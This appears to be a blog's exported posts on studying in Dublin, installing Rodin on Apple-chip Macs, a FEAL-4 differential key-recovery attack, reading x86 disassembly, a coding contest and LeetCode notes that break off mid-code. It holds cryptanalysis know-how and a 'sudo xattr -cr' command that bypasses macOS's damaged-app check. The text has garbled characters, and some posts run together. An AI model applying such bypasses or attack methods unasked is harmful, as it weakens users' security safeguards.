[{"content":"This isn\u0026rsquo;t really a comprehensive guide, just some personal supplementary information to Chen He\u0026rsquo;s content.\nChen He\u0026rsquo;s link: https://chenhe.me/post/ireland\nChen He\u0026rsquo;s content is excellent and detailed, basically answering many of my initial questions about coming to Ireland.\nThe article is incomplete and will be updated periodically.\nBackground Location is in Dublin, admitted to DCU.\nBefore Departure Let me specify the model directly: Supor Little Green Pressure Cooker. Why this specific one and not others? Because: 1. Pressure-cooked rice tastes better. 2. It\u0026rsquo;s more convenient for stewing dishes like beef brisket or braised chicken legs. I also brought a Xiaomi rice cooker, but found that the rice cooked in it wasn\u0026rsquo;t as tasty - only pressure-cooked rice tastes goodðŸ˜‹. Also, this model seems to be the only one that can cook rice in just 10 minutes under pressure. Looking at other models, none were this fast, possibly due to its smaller capacity. Medications: Strongly recommend bringing Gan Kang (cold medicine) - one pill makes you feel much better when you have a cold. Also bring some transparent waterproof band-aids. Water bottle: After arriving, I found it difficult to buy a water bottle I liked. If you\u0026rsquo;re still in China, it\u0026rsquo;s important to buy a suitable water bottle from Taobao. Xiaohongshu: Previously thought it was just a beauty app, barely used it in China. After going abroad, I discovered it\u0026rsquo;s actually an overseas life app. There are many guides on the following topics on Xiaohongshu, you can browse as needed. Of course, some people dislike it and look down upon it - to each their own (don\u0026rsquo;t hit me, Chen He). Driver\u0026rsquo;s license: I brought mine, but it expired after arrival, so I haven\u0026rsquo;t used it much. If it\u0026rsquo;s still valid, it can reduce the time needed for getting a license here. Cash: Actually, you don\u0026rsquo;t need to exchange too much Euro. Having a dual-currency credit card like Visa or Mastercard set up in China is sufficient - you can use it directly here. Cash transactions are relatively rare here. Clothes: Recommend bringing layered clothing. Due to the variable weather and large temperature differences between indoor and outdoor, you might need to frequently add or remove layers. Winters are quite cold, you can bring two down jackets or similar thickness coats to alternate. Luggage: Hainan Airlines allows student verification, permitting up to two 28-inch suitcases. However, that was too much for me - I ended up bringing one 20-inch and one 28-inch. Also, a 28-inch suitcase can easily exceed weight limits when full. A 26-inch would also work. Medical check-ups, dental work, surgeries, etc.: These are expensive here, try to get them done in China. Things like dental fillings or laser surgeries. Power adapters: A high-quality power adapter will be very convenient. Consider preparing some simple adapters and buying one with multiple charging ports. Also consider purchasing a special power strip that has a UK standard plug but Chinese standard sockets. Living expenses: Rent might be â‚¬600-1200, if you cook your own meals, food costs about â‚¬500 per month, total living expenses might be â‚¬1000-1800 per month, depending on personal spending habits. Flights: Hainan Airlines\u0026rsquo; direct flights to Dublin are good, especially if you transit through Shanghai rather than flying from Beijing - the tickets are cheaper. So taking an extra flight actually saves money. Temporary accommodation: Can be booked on Airbnb or Booking. Chinese cooking ingredients: After arriving, you\u0026rsquo;ll find that a large part of daily life is grocery shopping and cooking. However, basically all seasonings are available at local Chinese supermarkets, so you don\u0026rsquo;t need to bring too many seasonings. For a specific list of items sold, you can search the Rong Xing Hang WeChat mini-program \u0026ldquo;353 Gou\u0026rdquo;. Immigration Just show the following:\nPassport Insurance Admission letter After Arriving in Ireland Arrive at accommodation: Just hail a taxi at the airport. Get a phone card: You can get a student plan, â‚¬20 for unlimited data. I got Vodafone. Remember to set up automatic 20-day top-up, otherwise you\u0026rsquo;ll need to manually top up each time. Get a transit card: First get an adult card, then exchange it for a student card in the city center. Student cards are half price. You can then cancel the adult card on the website and get a refund. Apply for IRP (Irish Residence Permit): Book in advance, if you wait until September when school starts, you\u0026rsquo;ll be queuing until November. With IRP, you can leave Ireland, like going back home or visiting the UK or Europe. Apply for a bank card: Can be done through AIB, no need to visit in person, can be done via phone. Requires student ID, student bank cards are free of annual fees. Apply for the bank card early, as the address proof it provides is important for other procedures. Apply for PPSN: Although not always necessary, better to have it just in case. Get it done early. It\u0026rsquo;s needed for tax purposes if you find an internship. It\u0026rsquo;s also needed for driver\u0026rsquo;s license applications. Payments Most daily scenarios use card payments - just tap your card on the wireless symbol to pay. You can also set up Apple Pay on your phone for payments.\nHousing There are two apartments near DCU, highly recommended, on Shanowen Road: Shanowen Square and Shanowen Hall. Best to book several months in advance, otherwise there might not be available rooms. In the city center, Beckett House is also good, suitable for TCD students. Of course, if you get lucky with the school dorm lottery, that\u0026rsquo;s the best. In summary, prioritize school dorms, student apartments, then look for private rentals. As for homestays or living with landlords, it varies by person - for me, I\u0026rsquo;ve experienced it, not a nightmare but not a dream either, but having the experience is enough, I wouldn\u0026rsquo;t want to do it again. Some classmates said their homestay environment was good though.\nHome and Bedding You can order from IKEA, they\u0026rsquo;ll deliver to your room. But note that delivery times aren\u0026rsquo;t always accurate, might arrive the next day. Remember to use student discounts - I realized after checkout that there was a discount, contacted staff, and they helped cancel and re-settle the payment. Homebase also has good stuff, their electric heaters are great - dozens of euros for a large but light one, useful when heating stops at night in winter.\nPharmacies Rarely visited pharmacies in China, but pharmacies here sell many things besides medicine, like cosmetics, health products, skincare, and bath products. Basically, Boots can handle everything. There\u0026rsquo;s a large Boots in the city center with a photo booth on the second floor, very versatile.\nDining Basically cook for yourself. You can buy ingredients from Rong Xing Hang Chinese supermarket in the city center. Rong Xing Hang\u0026rsquo;s mini-program offers city-wide delivery, free delivery for orders over â‚¬30 with the note \u0026ldquo;Rong Yi Life\u0026rdquo;, orders placed in the morning arrive in the afternoon, very convenient!!!\nI don\u0026rsquo;t use other supermarkets much. There\u0026rsquo;s LIDL and Tesco near DCU with some fresh produce, I mainly use them for meat.\nAs for meat, the pork here has such a strong smell. Basically haven\u0026rsquo;t eaten it. Only eat beef.\nLIDL\u0026rsquo;s Rib eye steak is quite good, well-marbled, â‚¬8+ for 400g, can last two meals. Also LIDL\u0026rsquo;s chicken legs with skin and bone are very cost-effective.\nRong Xing Hang sells beef brisket, makes great stewed beef.\nThe stoves here aren\u0026rsquo;t great to use, mostly electric ceramic hobs. Might need some time to get used to the heat levels.\nPublic Transit Ireland\u0026rsquo;s public transit system is well-developed, basically no need for taxis. TFI Live can show real-time arrival times for the next bus at any stop, more accurate than Google, very useful at stops without electronic displays, recommended to download and use. Mainly buses, occasionally Luas, Dart, etc.\nOnline Shopping Recommend using Shein, free shipping above certain amounts. Usually takes about 10 days for delivery. Can buy daily necessities, etc. No food items.\nAlso students can get free Amazon student membership for six months. Greatly reduces shipping costs.\nIf not using Shein and wanting to shop like on Taobao, then use international shipping companies - air freight takes 10 days but shipping costs are extremely high, about 200-300 RMB for 2kg. Sea freight is cheaper, about 60-80 RMB for 2kg. So if you can buy daily necessities on Shein, try to buy there, shipping is free.\nOchama has more comprehensive products, including various Chinese foods and some Jingzao products (JD\u0026rsquo;s European company), use invitation code (7WYM5K) at checkout for â‚¬10 off. But shipping is expensive, rarely used without discounts.\nClothing Dundrum Town Centre in the south has lots of clothing stores. Henry St in the city center also has many clothing stores.\nDomestic Travel If you\u0026rsquo;ve signed up for a language course (I did DCU\u0026rsquo;s 5-week language course, quite good, otherwise the start of school would be too overwhelming, it\u0026rsquo;s like getting to know the school in advance), July-August are good for traveling. Can visit Galway and Cork. But if you haven\u0026rsquo;t signed up for a language course and only arrive in September, the weather isn\u0026rsquo;t great, it gets cold and daylight hours decrease significantly, so September when school starts is okay for travel, but after October isn\u0026rsquo;t suitable. The next good time for travel would be after April next year, when daylight returns and temperatures rise.\nVisas Try to apply for UK visa in China, if applying in Ireland, they only give 6 months, but in China, they give 2 years. This makes it convenient whether going to Northern Ireland or the UK. Courses here are short. After winter break and second semester, there\u0026rsquo;s lots of free time. If you don\u0026rsquo;t have plans, it can be very boring. Especially in winter when daylight is short. Since visa applications here basically require using scalpers to queue, recommend starting visa applications right after arrival. To be safe, pick an embassy and start applying for visas. Make one round trip to the destination country during the visa period. This process will also cost lots of time and money, but there\u0026rsquo;s no way around it - to get a long-term Schengen visa, you need to accumulate entry/exit records. I applied for a French visa. Usually they issue visas for these durations: 1 month, 3 months, 6 months, 1 year, multiple years. Single or multiple entry doesn\u0026rsquo;t matter, as visas over 3 months are unlikely to be single entry. Job Hunting This is also crucial. Came here clueless, only got a clear understanding after arrival. This section will be updated after I complete the process since I\u0026rsquo;m still job hunting.\nNG positions: Also known as campus recruitment positions, application period is September to November after arrival. Most NG positions close after November. So need to apply early. Regardless of skill level, recommend applying for NG positions. However, for those with over 2 years of experience, it\u0026rsquo;s difficult to get NG positions at big companies. But going through the process, if you get interviews, it\u0026rsquo;s good experience. Experienced positions: Application period starts in late April next year. Since I\u0026rsquo;m just starting to apply, I can\u0026rsquo;t really say much about it yet. Also, job hunting is somewhat up to fate. Many companies require you to have a 1G visa before they\u0026rsquo;ll even consider giving you an interview opportunity. If you apply too early, companies won\u0026rsquo;t process your application. Internship positions: These are hit or miss, since the master\u0026rsquo;s is only one year, many internship positions aren\u0026rsquo;t for us but for undergraduates. Can only say, try applying. Contact If you have questions, you can also contact me through these channels.\nXiaohongshu:\nWhatsappï¼š\n","date":"2025-04-10T18:12:52Z","permalink":"https://example.org/post/2025/04/ireland-study-guide/","title":"Incomplete Guide to Studying in Ireland"},{"content":"ChatGPT GPT-4o: Versatile.

After purchasing a shared premium account, we can export a company\u0026rsquo;s problems as a CSV file, then export our own problem-solving records as another CSV file. By comparing these two files, we can easily track our current progress. Cursor is very good at writing such small tools:\nWe just need to copy elements from the webpage, and Cursor can write complete CSV files for us and automatically generate a perfect frontend interface, greatly improving our problem-solving efficiency.\n","date":"2025-04-08T19:47:48Z","permalink":"https://example.org/post/2025/04/aitest/","title":"Summary of LLM Tools Usage Experience"},{"content":"Steps to Install Rodin on macOS (M1 ARM Architecture): Install x86 JDK Download the Intel x86 JDK 18 (macOS .dmg) from Oracle:\njdk-18.0.2.1_macos-x64_bin.dmg\nRun the installer; it automatically configures the Java environment.\nDownload and Install Rodin Get Rodin 3.8/3.9 (x86_64 version) from SourceForge:\nrodin-3.8.0.202304051545- macosx.cocoa.x86_64.tar.gz\nExtract the .tar.gz file and move Rodin.app to the /Applications folder.\nFix macOS Security Permissions Run this command to bypass \u0026ldquo;app is damaged\u0026rdquo; errors: sudo xattr -cr /Applications/Rodin.app Rodin should be able to run without any additional steps (e.g., configuring the Java VM path).\n","date":"2025-02-01T13:01:39Z","permalink":"https://example.org/post/2025/02/rodin/","title":"How to install Rodin software on a MacBook with an Apple chip"},{"content":"This article primarily introduces how to perform differential cryptanalysis on the traditional block cipher algorithm FEAL-4, and demonstrates the attack process and key implementation details. The text also includes some experimental data and attack results for interested readers to reference or reproduce.\nTwo Important Images Before delving into the analysis, here are two images closely related to FEAL-4 to provide an intuitive understanding of differential propagation and the overall encryption process.\nDifferential Propagation Diagram\nThe figure below shows how plaintext differences (in XOR form) propagate through the encryption rounds in FEAL-4 and ultimately reflect in the ciphertext.\nFEAL-4 Workflow Diagram\nThe following figure illustrates the overall encryption framework of FEAL-4, including the left and right blocks of the plaintext, the injection of round subkeys, and the usage flow of the F function.\nCharacteristics of the F Function The round function of FEAL-4 (i.e., the F function) can be viewed as some form of random permutation on a 32-bit input. In differential analysis, we do not need the specific implementation of F, but rather focus on its two key differential properties:\nIf $X \\oplus Y = 0$, then $F(X) = F(Y)$. If $X \\oplus Y = 0x80800000$, then $F(X) \\oplus F(Y) = 0x02000000$. With these two conclusions, we can infer the output behavior under specific differential inputs in subsequent analyses, thereby aiding in locating the subkeys.\nDetailed Analysis of Differential Paths Suppose we choose a pair of special plaintexts $P_0$ and $P_1$ such that: $$ P_0 \\oplus P_1 = 0x8080000080800000 = P^{\\prime}. $$ This specific differential vector helps simplify the differential computations in several rounds of FEAL-4 outputs.\n1. Derivation of Initial Round Differences Let $(L0_0, R0_0)$ denote the left and right blocks of $P_0$ (similarly, $(L0_1, R0_1)$ denotes those of $P_1$).\nAfter the XOR operation in the first round: $$ L1_0 \\oplus L1_1 = (L0_0 \\oplus K4) \\oplus (L0_1 \\oplus K4) = L0_0 \\oplus L0_1 = 0x80800000. $$ Similarly, the differential of the right half can be derived.\nFurthermore, due to the \u0026ldquo;additional XOR round\u0026rdquo; during encryption, we obtain: $$ R2_0 \\oplus R2_1 = (R1_0 \\oplus L1_0) \\oplus (R1_1 \\oplus L1_1) = 0x80800000 \\oplus 0x80800000 = 0. $$ This implies that in subsequent computations, the differences can be merged in a simpler form.\n2. Backward Differential Calculation After obtaining the plaintext pair $(P_0, P_1)$ and the corresponding ciphertext pair $(C_0, C_1)$, further backward derivations can be made. Let the ciphertext be denoted as $(L, R)$, then:\nCompute $C^{\\prime} = C_0 \\oplus C_1$, obtaining $(L^{\\prime}, R^{\\prime})$. Based on the known differential properties, gradually restore intermediate variables such as $X^{\\prime}$, $Y^{\\prime}$, $Z^{\\prime}$, etc., in the last round. Using these results, attacks or verifications on the subkeys can be performed. Attacking K3 In differential analysis, one often starts with attacking an intermediate round subkey, such as $K_3$. The specific steps are as follows:\nSelect Plaintext Pairs: I generated 12 pairs of random plaintexts satisfying\n$$ P_0 \\oplus P_1 = 0x8080000080800000 $$ Encrypt and Extract Differences: Encrypt the above plaintext pairs to obtain the corresponding ciphertext pairs; combine with the differential path to derive intermediate values $Y_0$, $Y_1$, $Z^{\\prime}$, etc. Traverse $K_3$:\n$$ Z^{\\prime} = Z_0 \\oplus Z_1 = F(Y_0 \\oplus K_3) \\oplus F(Y_1 \\oplus K_3). $$\nAny candidate $K_3$ that satisfies the differential equation $= 0x02000000$ is retained. Using this method, I successfully obtained four candidate subkeys:\ncfa38976, cfa309f6, 4f238976, 4f2309f6 An example command to execute the above process is:\n./main -mode=attackk3 -file=K3.txt This implementation is consistent with the method I introduced on www.theamazingking.com.\nAttacking K2 After obtaining several candidates for $K_3$, we can proceed to deduce $K_2$. The core equation is: $$ X\u0026rsquo; = X_0 \\oplus X_1 = F(U_0 \\oplus K_2) \\oplus F(U_1 \\oplus K_2), $$ where $U$ comes from the previous round operations (including further computations on $Y$, $Z$, etc.). Similarly:\nGenerate plaintext pairs that satisfy the differential condition $$ P_0 \\oplus P_1 = 0x0000000080800000. $$ Capture ciphertext differences after encryption, and by traversing all possible $K_2$ values, check if the differential constraint $=0x02000000$ is satisfied. Example command: ./main -mode=attackk2 -file=K2.txt -k3=cfa38976,cfa309f6,4f238976,4f2309f6 The final output example is as follows: Candidate K2: 8b722e41 (K3: cfa38976) Candidate K2: 8b72aec1 (K3: cfa38976) ... Candidate K2: 89722e43 (K3: 4f2309f6) Candidate K2: 8972aec3 (K3: 4f2309f6) Attacking K1 Similarly, attacking $K_1$ can be done following the previous process.\nTo ensure the differential path consistently presents the expected results, I generated 12 plaintext pairs satisfying\n$$ P_0 \\oplus P_1 = 0x0000000002000000 $$\nand verified their encryption outputs.\nExample command:\n./main -mode=attackk1 -file=K1.txt -k3k2=\u0026#34;cfa38976,8b722e41; cfa38976,8b72aec1; ...\u0026#34; This allows you to input all previously obtained candidate combinations of $K_3$ and $K_2$ at once, and finally find the corresponding $K_1$ candidates.\nAttacking K0, K4, K5 Once $K_3$, $K_2$, and $K_1$ are all obtained, $K_0$, $K_4$, and $K_5$ required for the last round can be deduced.\nLet the final encrypted left and right parts be $L_0$, $R_0$. The corresponding plaintext blocks are $PL$, $PR$. Then:\n$PL \\oplus K_4 = LR_0$ $PR \\oplus K_5 = RR_0$ $RR_0 \\oplus LR_0 = R_0$ $f(R_0 \\oplus K_0) \\oplus L_0 = LR_0$ By enumerating all possible $K_0$, the corresponding $K_4$ and $K_5$ can be solved through the above equations. Then, use other plaintext-ciphertext pairs to cross-validate correctness. If all are satisfied, the correct final key set is obtained.\nExample command:\n./main -mode=attackk0k4k5 -k3k2k1=\u0026#34;...\u0026#34; -file=K1.txt -file2=K1_p.txt Implementation, Optimization, and Verification 1. Automated Generation and Parallel Computing Automatically Generate Random Plaintext Pairs: Control the XOR differences in the code in advance to batch output plaintext files that meet the requirements (e.g., K3_p.txt, K2_p.txt, K1_p.txt). Parallelized Search: Use Go\u0026rsquo;s Goroutines to start 10 parallel tasks, maximizing CPU resource utilization on a 10-core Mac. Progress Bars and Visualization: Use the progressbar library to display search progress in real-time, making the experimental process more intuitive. 2. Verification Methods Local Custom Key Testing\nFirst, select a set of known $K_0$â€“$K_5$ (e.g., 0x00000001, 0x00000002, 0x00000004, 0x00000008, 0x00000010, 0x00000020), encrypt the previously generated plaintext pairs, and repeat the differential analysis process to see if this set of keys can be matched among the results.\nExperiments confirmed the ability to correctly restore this set of test keys, thereby verifying the accuracy of the code logic.\nSpecific Plaintext-Ciphertext Pair Testing\nSelect a plaintext 1234567890abcdef and the ciphertext f43ae3eeb56e2bbf generated in the Einstein Zone, and verify that each of the 256 candidate $K_0$â€“$K_5$ sets can reproduce this encryption mapping, further confirming the attack process is correct.\nFinal Results All deduced $K_0$â€“$K_5$ are stored in final_result.txt. After deduplication, they include the following ranges:\nPossible Values for K0 890c2148 890ca1c8 098c2148 098ca1c8 ... 0b8c214a 0b8ca1ca 8b0c214a 8b0ca1ca Possible Values for K1 471f077e 471f87fe c79f077e c79f87fc ... 451f077c 451f87fc c59f077c c59f87fc Possible Values for K2 8b722e41 8b72aec1 8b722e43 8b72aec3 ... 89722e43 8972aec3 Possible Values for K3 cfa38976 cfa309f6 4f238976 4f2309f6 Possible Values for K4 89eb0024 89eb0026 8beb0024 8beb0026 Possible Values for K5 b85e6bc0 b85e6bc2 ba5e6bc0 ba5e6bc2 With the aid of differential analysis, we ultimately obtained a set of candidate subkeys. Compared to modern block ciphers (such as AES), FEAL-4 has fewer rounds and a simpler structure, making it very suitable for demonstrating the concept of differential analysis in teaching and research.\nConclusion This article detailed the complete process of performing a differential attack on FEAL-4, including designing differential paths, generating plaintext pairs, attacking intermediate subkeys ($K_3$, $K_2$, $K_1$), and finally reverse-solving for $K_0$, $K_4$, $K_5$. It also introduced several optimizations and verification methods during the code implementation process.\nThe FEAL-4 algorithm, due to its fewer rounds and simpler structure, provides convenience for differential analysis. However, for more secure and complex modern block algorithms, the same analytical approach remains crucial. This case study aims to inspire learners and researchers in cryptography.

Since the problems typically assume all parameters are of type int or int*, ebp+8, ebp+c, and ebp+10 correspond to the first, second, and third parameters, respectively.\nBy quickly scanning the code for occurrences of 0x__(%ebp) and identifying the largest offset, the number of parameters can be determined as (offset - 4) // 4.\nFor example:\npush %ebp \u0026lt;foo+0\u0026gt; mov %esp, %ebp \u0026lt;foo+1\u0026gt; sub $0x4, %esp \u0026lt;foo+3\u0026gt; mov 0x8(%ebp), %eax \u0026lt;foo+6\u0026gt; mov %eax, -0x4(%ebp) \u0026lt;foo+9\u0026gt; mov -0x4(%ebp), %eax \u0026lt;foo+12\u0026gt; cmp 0x10(%ebp), %eax \u0026lt;foo+15\u0026gt; jge \u0026lt;foo+32\u0026gt; \u0026lt;foo+18\u0026gt; mov 0xc(%ebp), %eax \u0026lt;foo+20\u0026gt; incl (%eax) \u0026lt;foo+23\u0026gt; lea -0x4(%ebp), %eax \u0026lt;foo+25\u0026gt; incl (%eax) \u0026lt;foo+28\u0026gt; jmp \u0026lt;foo+12\u0026gt; \u0026lt;foo+30\u0026gt; mov $0x0, %eax \u0026lt;foo+32\u0026gt; leave \u0026lt;foo+37\u0026gt; ret \u0026lt;foo+38\u0026gt; Here, 0x10(%ebp) exists, so the parameter count is (16 - 4) / 4 = 3.\nWe can construct the framework of the code as:\nint foo(int a, int b, int c) { } a, b, and c correspond to ebp+8, ebp+c, and ebp+10, respectively. Note that parameters are pushed onto the stack in reverse order, so the closer to ebp, the earlier the parameter appears in the list.\nFor now, assume all are int types. Adjust later if inconsistencies are found.\nIdentify the Number of Local Variables The number of local variables is determined by the third line of the code: sub $0x4, %esp. The amount subtracted corresponds to the length of the allocated local variables.\nIn this example, sub $0x4, %esp indicates 4 bytes, so there is one local variable. Assume it is an int and name it i.\nThe code expands to:\nint foo(int a, int b, int c) { int i; } Recognize the Loop Body Loops are typically while or for loops. To identify:\nJudgment Entry:\nLook for a comparison instruction (e.g., cmp) followed by a jump instruction (e.g., jge or jle). These indicate the start of a condition check. Loop Body:\nUnconditional jmp instructions signify loops. The jump target is the beginning of the condition check. Condition:\nThe judgment condition combines the comparison and preceding instructions into a complete condition. Example: push %ebp \u0026lt;foo+0\u0026gt; mov %esp, %ebp \u0026lt;foo+1\u0026gt; sub $0x4, %esp \u0026lt;foo+3\u0026gt; mov 0x8(%ebp), %eax \u0026lt;foo+6\u0026gt; mov %eax, -0x4(%ebp) \u0026lt;foo+9\u0026gt; mov -0x4(%ebp), %eax \u0026lt;foo+12\u0026gt; cmp 0x10(%ebp), %eax \u0026lt;foo+15\u0026gt; jge \u0026lt;foo+32\u0026gt; \u0026lt;foo+18\u0026gt; mov 0xc(%ebp), %eax \u0026lt;foo+20\u0026gt; incl (%eax) \u0026lt;foo+23\u0026gt; lea -0x4(%ebp), %eax \u0026lt;foo+25\u0026gt; incl (%eax) \u0026lt;foo+28\u0026gt; jmp \u0026lt;foo+12\u0026gt; \u0026lt;foo+30\u0026gt; mov $0x0, %eax \u0026lt;foo+32\u0026gt; leave \u0026lt;foo+37\u0026gt; ret \u0026lt;foo+38\u0026gt; Judgment Entry:\nThe combination of cmp and jge indicates a judgment entry.\nLoop:\nThe jmp command jumps to \u0026lt;foo+12\u0026gt;, signifying the loop condition check.\nCondition:\nmov -0x4(%ebp), %eax: Assigns the value of i to eax. cmp 0x10(%ebp), %eax: Compares eax (value of i) with c. This calculates i - c and checks the condition with jge. In assembly, conditions are reversed compared to C: jge skips the loop if the condition is met. Thus, the C condition is i - c \u0026lt; 0.\nThe code updates to:\nint foo(int a, int b, int c) { int i; while (i - c \u0026lt; 0) { } } Analyze Remaining Code Snippets Before the Loop:\nmov 0x8(%ebp), %eax \u0026lt;foo+6\u0026gt; mov %eax, -0x4(%ebp) \u0026lt;foo+9\u0026gt; These lines assign the value of a to i:\ni = a; Inside the Loop:\nmov 0xc(%ebp), %eax \u0026lt;foo+20\u0026gt; incl (%eax) \u0026lt;foo+23\u0026gt; lea -0x4(%ebp), %eax \u0026lt;foo+25\u0026gt; incl (%eax) \u0026lt;foo+28\u0026gt; mov 0xc(%ebp), %eax and incl (%eax) increment the value at the address stored in b: (*b)++; lea -0x4(%ebp), %eax and incl (%eax) increment i: i++; The updated code becomes:\nint foo(int a, int *b, int c) { int i; i = a; while (i - c \u0026lt; 0) { (*b)++; i++; } } Identify the Return Value In x86 calling conventions, return values are stored in the eax register.\nmov $0x0, %eax This indicates the function returns 0:\nreturn 0; Final Code int foo(int a, int *b, int c) { int i; i = a; while (i - c \u0026lt; 0) { (*b)++; i++; } return 0; } ","date":"2024-11-03T14:21:43Z","permalink":"https://example.org/post/2024/11/disassembly/","title":"How to Quickly Solve Disassembly Problems"},{"content":"In a previous article, I used Obsidian\u0026rsquo;s QuickAdd to create a script that automatically converts text copied from ChatGPT and fixes the LaTeX formatting.

Here, Iâ€™d like to share my experience in this competition and summarize some key takeaways.\nOur algorithm code can be found here: huawei2024\nCompetition Results We achieved first place in the algorithm section, scoring approximately 4%-5% higher than the second to fourth places, giving us a significant advantage. However, we faced considerable challenges in the presentation segment. First, we recognized that there is room for improvement in our English fluency. Second, we found that our presentation slides could be more polished and visually appealing. Lastly, we encountered some challenges with time management. Nevertheless, despite these obstacles, we still managed to secure third place overall.\nCompetition Process The competition was divided into two stages. The first stage allowed ample preparation time. Once we settled on using the simulated annealing algorithm, we began developing it. The main difficulty in this stage was optimizing and understanding the requirements of the task. During development, we encountered numerous bugs, but after fixing them, our score improved significantly.\nIn the second stage, as the problem was released on the day of the competition, I continued optimizing the algorithm from the first stage, successfully increasing the evaluation speed by 1000 times. This significantly boosted our performance in the second stage, providing us with enough strength to vie for first place.\nIn the final round, our algorithm performed very consistently, and after some adjustments, we took a considerable lead over our competitors. However, because we didn\u0026rsquo;t put enough emphasis on making an effective presentation, we mistakenly believed that high algorithm performance alone would guarantee a top score, which proved to be wrong.\nLessons Learned Algorithm Choice Fortunately, I chose the right algorithm from the outset, and shortly after the problem was released, I devised a framework that suited the entire competition. However, I did take some wrong turns, such as attempting impractical algorithms like PPO. After initial trials failed, I should have moved on instead of wasting further effort. Given the limited time, we should focus on achievable optimal results within the shortest period rather than pursuing ideal but unrealistic solutions. It\u0026rsquo;s also crucial to recognize one\u0026rsquo;s limitations and concentrate on goals that are achievable in the available time.\nTeam Collaboration Luckily, our team division was reasonable this time, and I did my best to ensure every member could contribute their value. One area for improvement is communicating more with team members to understand their ideas and preferences. Since I mainly handled the algorithm part, I had relatively little interaction with teammates, which I will work to improve next time.\nPresentation Design We didnâ€™t anticipate that the level of presentation skills from other teams would be so high. My teammates speculated that some competitors might have a business background, giving them an advantage in crafting presentations. Moreover, they had five members in their team while we only had three, which put us at a disadvantage regarding manpower. These were objective challenges, but if we had paid more attention to creating our presentation, the first prize could have been within our reach.\nOver-committing Leading to Imbalance In the final round, our algorithm was already quite excellent, and our score surpassed the previously top-ranked team. However, I continued spending considerable time on further optimizations. Even though we were significantly ahead, this focus caused us to neglect the preparation of our presentation. In hindsight, I should have known when to stop and fully recognized the importance of balancing different aspects of the scoring criteria.\nConclusion Participating in the Huawei Tech Arena 2024 competition provided me with invaluable experience. The competition highlighted our strengths, but also revealed areas where we need to improve in terms of showcasing skills and team collaboration. Looking ahead, I will keep these lessons in mind and strive to continuously improve myself in future competitions.

Previously, I only did a few problems to maintain familiarity, but today, I officially started preparing for interviews.\nI have been thinking about how to efficiently solve Leetcode problems. In my opinion, to be efficient, one must memorize problems. Just as reading a book a hundred times reveals its meaning, training a language model through extensive practice hones its coding skills. Similarly, with Leetcode, through repeated practice, the answers will come naturally; quantity brings quality.\n53. Maximum Subarray The solution can be approached using Kadane\u0026rsquo;s Algorithm. The code is as follows:\ndef maxSubArray(nums): max_current = max_global = nums[0] for num in nums[1:]: max_current = max(num, max_current + num) max_global = max(max_global, max_current) return max_global This is a classic dynamic programming problem, and the above algorithm actually hides the essence of dynamic programming.\nclass Solution { public: int maxSubArray(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;int\u0026gt; dp(nums.size()); dp[0] = nums[0]; for (int i = 1; i \u0026lt; nums.size(); i++) { dp[i] = max(dp[i - 1] + nums[i], nums[i]); } return *max_element(dp.begin(), dp.end()); } }; This code better reflects the essence of dynamic programming.\nTo understand the formula dp[i] = max(nums[i] + dp[i-1], nums[i]), we can analyze it from a dynamic programming perspective. The core idea here is to make the optimal choice at each position. Here is a detailed explanation:\n1. What does dp[i] represent? dp[i] represents the maximum subarray sum ending at position i. 2. Why compare nums[i] + dp[i-1] and nums[i]? The key question is: Should the current maximum subarray include the previous part (dp[i-1])? nums[i] + dp[i-1]: If dp[i-1] is positive, adding the current nums[i] will increase the subarray sum, so we choose to add it. nums[i]: If dp[i-1] is negative, we choose to start a new subarray from the current position, as a negative sum will only drag down the current sum. 3. Why not compare subsequent numbers? When making the comparison, we assume the subarray stops at position i. In other words, we consider the maximum value within the range [0:i]. At position i, we either add the previous subarray or abandon it and only use the current number. We then traverse the entire array, finding the maximum value at each position, and finally return the largest value. 57. Insert Interval This is a classic interval merging problem, where we need to merge a new interval into existing intervals.\nThe solution can be broken down as follows:\nStep 1: Add all non-overlapping intervals that come before newInterval to the result. Step 2: Merge all potentially overlapping intervals with newInterval. Note the conditions for merging. Step 3: Add the remaining intervals to the result. Note that the condition for merging intervals is that the start of the previous interval is less than or equal to the end of the subsequent interval, i.e., intervals[i][0] \u0026lt;= newInterval[1].\nclass Solution: def insert(self, intervals: List[List[int]], newInterval: List[int]) -\u0026gt; List[List[int]]: ret_list = [] i = 0 while i \u0026lt; len(intervals) and intervals[i][1] \u0026lt; newInterval[0]: ret_list.append(intervals[i]) i += 1 while i \u0026lt; len(intervals) and intervals[i][0] \u0026lt;= newInterval[1]: newInterval[0] = min(intervals[i][0], newInterval[0]) newInterval[1] = max(intervals[i][1], newInterval[1]) i += 1 ret_list.append(newInterval) while i \u0026lt; len(intervals): ret_list.append(intervals[i]) i += 1 return ret_list With careful attention to detail, this problem is not difficult.\n300. Longest Increasing Subsequence This is obviously a dynamic programming problem.\ndp[i] represents the length of the longest increasing subsequence ending with a certain number.\nEach time an element is added, we update the current dp array. If the current number is greater than the previous one, we increment the result by 1.\nNote that the first dp[i] starts from index 1.\nclass Solution: def lengthOfLIS(self, nums: List[int]) -\u0026gt; int: dp = [1] * len(nums) for i in range(1, len(nums)): for j in range(i): if nums[j] \u0026lt; nums[i]: dp[i] = max(dp[i], dp[j] + 1) return max(dp) Complexity Analysis:\nTime Complexity: $O(n^2)$, due to the two nested loops. Space Complexity: $O(n)$, as we need a dp array of length n. 674. Longest Continuous Increasing Subsequence This is a simple problem, but still worth understanding.\nclass Solution: def findLengthOfLCIS(self, nums: List[int]) -\u0026gt; int: dp = [1] * len(nums) for i in range(1, len(nums)): if nums[i] \u0026gt; nums[i-1]: dp[i] = max(dp[i], dp[i-1] + 1) return max(dp) 392. Is Subsequence class Solution: def isSubsequence(self, s: str, t: str) -\u0026gt; bool: i = 0 j = 0 while i \u0026lt; len(s) and j \u0026lt; len(t): if s[i] == t[j]: i += 1 j += 1 return i == len(s) This problem can be solved using a two-pointer technique, with t as the base. If s contains matching characters, we move forward; if we reach the end of s, it means the match is complete.\n115. Distinct Subsequences This problem asks us to find how many distinct subsequences of string s equal string t.\nFirst, we need to define dp, where dp[i][j] represents the number of distinct subsequences that can be formed from the first i characters of s to form the first j characters of t.\ndp[i][0] represents when t is an empty string, the result is 1. dp[0][j] represents forming t from an empty string, which results in 0. For dp[i][j], the result depends on the characters at positions i and j:\nIf they are equal, the result is the sum of the cases where s[i-1] is not matched (dp[i-1][j]) and the cases where it is matched (dp[i-1][j-1]). If they are not equal, the result is equal to dp[i-1][j]. Note that i, j refer to the first i and j characters.\nAdditionally, dp[0][0] is initialized to 1, as an empty string is a subsequence of any string.\nclass Solution: def numDistinct(self, s: str, t: str) 